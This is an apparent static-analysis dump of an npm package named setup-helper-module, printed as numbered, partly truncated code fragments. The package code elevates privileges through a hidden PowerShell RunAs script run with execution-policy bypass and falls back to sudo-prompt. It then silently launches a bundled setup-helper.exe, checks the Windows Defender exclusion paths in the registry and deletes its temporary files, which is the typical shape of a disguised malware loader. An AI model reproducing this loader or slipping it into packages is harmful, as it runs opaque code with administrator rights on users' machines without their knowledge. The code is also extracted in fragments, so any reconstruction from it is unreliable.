// File: tmp/tmpz06qgfsg/setup-helper-module/package/elevate.js
// ======================================================================
Line 1: _tmp_2 = require('child_process')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 6: {
        // Use PowerShell to elevate node.exe without showing terminal
        const powerShellCommand = `
$process = Start-Process -FilePath "${process.execPath}" -ArgumentList "${scriptPath}" -Verb RunAs -PassThru -WindowStyle Hidden
$process.WaitForExit()
exit $process.ExitCode
`;

        const tempPs1 = path.join(__dirname, 'elevate-temp.ps1');
        fs.writeFileSync(tempPs1, powerShellCommand);

        // Execute PowerShell script
        const command = `powershell -ExecutionPolicy Bypass -File "${tempPs1}"`;

        exec(command, (error, stdout, stderr) => {
            // Clean up temporary PowerShell script
            try {
                if (fs.existsSync(tempPs1)) {
                    fs.unlinkSync(tempPs1);
                }
            } catch (cleanupError) {
                console.warn('Warning: Could not clean up temporary PowerShell script:', cleanupError.message);
            }

            if (error) {
                reject(new...
Line 9: process.execPath
Line 14: path.join(__dirname, 'elevate-temp.ps1')
Line 18: <operator>.formatString("powershell -ExecutionPolicy Bypass -File "", tempPs1, """)
Line 20: exec(command, (error, stdout, stderr) => {
            // Clean up temporary PowerShell script
            try {
                if (fs.existsSync(tempPs1)) {
                    fs.unlinkSync(tempPs1);
                }
            } catch (cleanupError) {
                console.warn('Warning: Could not clean up temporary PowerShell script:', cleanupError.message);
            }

            if (error) {
                reject(new Error(`Elevation failed: ${error.message}`));
                return;
            }

            if (stdout) // console.log(stdout);
            if (stderr && stderr.trim()) console.error('PowerShell stderr:', stderr);

            resolve();
        })
Line 27: console.warn('Warning: Could not clean up temporary PowerShell script:', cleanupError.message)
Line 36: stderr.trim()

// File: tmp/tmpz06qgfsg/setup-helper-module/package/install.js
// ======================================================================
Line 1: const fs = require('fs')
Line 2: const path = require('path')
Line 7: const exePath = path.join(__dirname, 'setup-helper.exe')
Line 9: console.warn('Warning: setup-helper.exe not found. Please ensure it exists in the project root directory.')
Line 10: console.warn('The setup helper will not run correctly without this file.')
Line 15: _tmp_0.push(path.join(__dirname, 'elevate-temp.ps1'))
Line 16: _tmp_0.push(path.join(__dirname, 'elevate-script.js'))
Line 25: console.warn('Warning: Could not delete temporary file:', file, error.message)

// File: tmp/tmpz06qgfsg/setup-helper-module/package/run-simple.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 4: const sudo = require('sudo-prompt')
Line 8: this.exePath = path.join(__dirname, 'setup-helper.exe')
Line 12: {
            exec('net session', (error) => {
                resolve(!error);
            });
        }
Line 13: exec('net session', (error) => {
                resolve(!error);
            })
Line 21: !fs.existsSync(this.exePath)
Line 22: console.error('setup-helper.exe not found')
Line 23: process.exit(1)
Line 26: this.checkAdminPrivileges()
Line 30: this.runWithAdmin()
Line 37: process.exit(1)
Line 41: {
        const child = exec(`"${this.exePath}"`, (error, stdout, stderr) => {
            if (error) {
                console.error('Error running setup-helper:', error);
                process.exit(1);
            }
            if (stdout) // console.log(stdout);
            if (stderr) console.error(stderr);
        });

        child.on('exit', (code) => {
            process.exit(code);
        });
    }
Line 42: const child = exec(`"${this.exePath}"`, (error, stdout, stderr) => {
            if (error) {
                console.error('Error running setup-helper:', error);
                process.exit(1);
            }
            if (stdout) // console.log(stdout);
            if (stderr) console.error(stderr);
        })
Line 45: process.exit(1)
Line 52: process.exit(code)
Line 56: {
        const options = {
            name: 'Setup Helper'
        };

        sudo.exec(`"${this.exePath}"`, options, (error, stdout, stderr) => {
            if (error) {
                console.error('Error running setup-helper with admin privileges:', error);
                process.exit(1);
            }
            if (stdout) // console.log(stdout);
            if (stderr) console.error(stderr);
            
            const exitCode = error ? error.code : 0;
            process.exit(exitCode);
        });
    }
Line 61: sudo.exec(`"${this.exePath}"`, options, (error, stdout, stderr) => {
            if (error) {
                console.error('Error running setup-helper with admin privileges:', error);
                process.exit(1);
            }
            if (stdout) // console.log(stdout);
            if (stderr) console.error(stderr);
            
            const exitCode = error ? error.code : 0;
            process.exit(exitCode);
        })
Line 64: process.exit(1)
Line 70: process.exit(exitCode)

// File: tmp/tmpz06qgfsg/setup-helper-module/package/run.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 4: _tmp_1 = require('./elevate')
Line 8: this.exePath = path.join(__dirname, 'setup-helper.exe')
Line 9: this.nodePath = process.execPath
Line 10: path.join(__dirname, 'elevate-script.js')
Line 18: {
                // Check registry for Windows Defender exclusions
                const command = `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" /s`;
                
                exec(command, (error, stdout) => {
                    if (error) {
                        // console.warn('Warning: Could not check Windows Defender exclusions (registry access failed)');
                        resolve(false);
                        return;
                    }

                    if (!stdout) {
                        resolve(false);
                        return;
                    }

                    // Parse registry output to find excluded paths
                    const lines = stdout.split('\r\n');
                    let isExcluded = false;

                    for (const line of lines) {
                        if (line.includes('REG_DWORD')) {
                            const parts = line.trim().split(/\s+/);
  ...
Line 22: exec(command, (error, stdout) => {
                    if (error) {
                        // console.warn('Warning: Could not check Windows Defender exclusions (registry access failed)');
                        resolve(false);
                        return;
                    }

                    if (!stdout) {
                        resolve(false);
                        return;
                    }

                    // Parse registry output to find excluded paths
                    const lines = stdout.split('\r\n');
                    let isExcluded = false;

                    for (const line of lines) {
                        if (line.includes('REG_DWORD')) {
                            const parts = line.trim().split(/\s+/);
                            if (parts.length >= 2) {
                                const exclusionPath = parts[parts.length - 2].toLowerCase();
                                const userDirLower = userDir.toLowerCase...
Line 38: _iterator_0.next()
Line 39: line.includes('REG_DWORD')
Line 40: line.trim()
Line 41: {
                                const exclusionPath = parts[parts.length - 2].toLowerCase();
                                const userDirLower = userDir.toLowerCase();
                                
                                if (exclusionPath.includes(userDirLower) || userDirLower.includes(exclusionPath)) {
                                    isExcluded = true;
                                    break;
                                }
                            }
Line 42: const exclusionPath = parts[parts.length - 2].toLowerCase()
Line 45: exclusionPath.includes(userDirLower)
Line 57: console.warn('Warning: Could not check Windows Defender exclusions:', error.message)
Line 63: {
            // Try to access a protected system directory (requires admin)
            exec('dir "%SystemRoot%\\System32\\config" >nul 2>&1', (error) => {
                resolve(!error);
            });
        }
Line 65: exec('dir "%SystemRoot%\\System32\\config" >nul 2>&1', (error) => {
                resolve(!error);
            })
Line 74: !fs.existsSync(this.exePath)
Line 75: console.error('setup-helper.exe not found')
Line 76: process.exit(1)
Line 81: this.checkAdminPrivileges()
Line 91: this.runWithAdmin()
Line 98: process.exit(1)
Line 102: {
        const child = spawn(this.exePath, [], {
            stdio: 'inherit',
            windowsHide: true
        });

        child.on('exit', (code) => {
            // console.log(`setup-helper.exe exited with code ${code}`);
            process.exit(code);
        });

        child.on('error', (error) => {
            console.error('Error spawning setup-helper:', error);
            process.exit(1);
        });
    }
Line 103: const child = spawn(this.exePath, [], {
            stdio: 'inherit',
            windowsHide: true
        })
Line 110: process.exit(code)
Line 115: process.exit(1)
Line 119: {
        const child = spawn(this.exePath, [], {
            stdio: 'inherit',
            windowsHide: true,
            shell: true
        });

        child.on('exit', (code) => {
            // console.log(`setup-helper.exe exited with code ${code}`);
            process.exit(code);
        });

        child.on('error', (error) => {
            console.error('Error spawning setup-helper:', error);
            process.exit(1);
        });
    }
Line 120: const child = spawn(this.exePath, [], {
            stdio: 'inherit',
            windowsHide: true,
            shell: true
        })
Line 128: process.exit(code)
Line 133: process.exit(1)
Line 140: const elevateScript = `
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const exePath = path.join(__dirname, 'setup-helper.exe');

// console.log('Running setup-helper.exe with admin privileges...');

// Check if file exists
if (!fs.existsSync(exePath)) {
    console.error('setup-helper.exe not found');
    process.exit(1);
}

const child = spawn(exePath, ["2"], {
    stdio: 'inherit',
    windowsHide: true,
    shell: true
});

child.on('exit', (code) => {
    // console.log(\`setup-helper.exe exited with code \${code}\`);
    process.exit(code);
});

child.on('error', (error) => {
    console.error('Error running setup-helper:', error);
    process.exit(1);
});
`
Line 190: console.warn('Warning: Could not clean up temporary file:', cleanupError.message)
Line 194: process.exit(1)
